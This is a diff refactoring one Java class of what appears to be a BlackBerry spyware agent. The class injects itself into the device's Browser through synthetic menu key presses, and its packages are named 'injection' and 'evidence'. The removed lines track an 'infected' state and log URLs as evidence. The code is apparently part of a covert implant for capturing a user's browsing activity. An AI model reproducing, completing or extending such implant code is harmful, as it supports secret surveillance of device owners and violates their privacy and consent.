@@ -16,17 +16,19 @@ import blackberry.Singleton;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
+import blackberry.injection.AppInjector;
 import blackberry.injection.AppInjectorInterface;
 import blackberry.injection.KeyInjector;
 import blackberry.interfaces.iSingleton;
 import blackberry.utils.Utils;
 
-public class AppInjectorBrowser implements AppInjectorInterface, iSingleton {
+public class AppInjectorBrowser extends AppInjector implements
+        AppInjectorInterface, iSingleton {
     //#ifdef DEBUG
     private static Debug debug = new Debug("AppInjBrowser", DebugLevel.VERBOSE);
     //#endif
 
-    BrowserMenuItem menu = BrowserMenuItem.getInstance();
+    BrowserMenuItem menu;
 
     private static AppInjectorBrowser instance;
     private static final long GUID = 0xa2b7338e410f087bL;
@@ -39,8 +41,7 @@ public class AppInjectorBrowser implements AppInjectorInterface, iSingleton {
 
     public static synchronized AppInjectorBrowser getInstance() {
         if (instance == null) {
-            instance = (AppInjectorBrowser) Singleton.self().get(
-                    GUID);
+            instance = (AppInjectorBrowser) Singleton.self().get(GUID);
             if (instance == null) {
                 final AppInjectorBrowser singleton = new AppInjectorBrowser();
 
@@ -51,8 +52,8 @@ public class AppInjectorBrowser implements AppInjectorInterface, iSingleton {
         return instance;
     }
 
-    private AppInjectorBrowser() {
-
+    public AppInjectorBrowser() {
+        menu = new BrowserMenuItem(this);
     }
 
     public boolean injectMenu() {
@@ -65,7 +66,7 @@ public class AppInjectorBrowser implements AppInjectorInterface, iSingleton {
         return true;
     }
 
-    public boolean callMenuByKey() {
+    public boolean actualCallMenuByKey() {
 
         Screen screen = UiApplication.getUiApplication().getActiveScreen();
 
@@ -99,7 +100,7 @@ public class AppInjectorBrowser implements AppInjectorInterface, iSingleton {
          */
 
         Utils.sleep(delay + tries * 20);
-        
+
         //#ifdef DEBUG
         debug.trace("callMenuByKey press menu key, try: " + tries);
         //#endif
@@ -113,7 +114,7 @@ public class AppInjectorBrowser implements AppInjectorInterface, iSingleton {
 
         Utils.sleep(delay + tries * 20);
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        
+
         menu.firstTime();
 
         if (screen != null) {
@@ -124,22 +125,6 @@ public class AppInjectorBrowser implements AppInjectorInterface, iSingleton {
 
     public String getAppName() {
         return "Browser";
-    }
-
-    public void callMenuInContext() {
-        menu.callMenuInContext();
-
-    }
-
-    public boolean isInfected() {
-        return infected;
-    }
-
-    public void setInfected(boolean value) {
-        if (value) {
-            Evidence.info("URL: " + tries);
-        }
-        infected = true;
     }
 
     public int getDelay() {
